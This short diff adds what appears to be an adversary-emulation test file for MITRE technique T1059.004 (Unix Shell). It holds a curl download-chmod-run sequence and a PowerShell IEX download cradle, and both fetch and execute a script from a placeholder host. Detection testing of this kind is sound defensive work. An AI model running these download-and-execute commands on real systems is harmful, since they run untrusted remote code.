@@ -1,0 +1,23 @@
+attack_technique: T1059.004
+display_name: Unix Shell
+atomic_tests:
+  - name: Download and execute
+    supported_platforms:
+      - linux
+    input_arguments:
+      remote_url:
+        default: https://example.invalid/payload.sh
+      output_file:
+        default: /tmp/payload.sh
+    executor:
+      name: sh
+      command: |
+        curl -sS #{remote_url} -o #{output_file}
+        chmod +x #{output_file}
+        #{output_file}
+  - name: Windows-only
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      command: IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a.ps1')
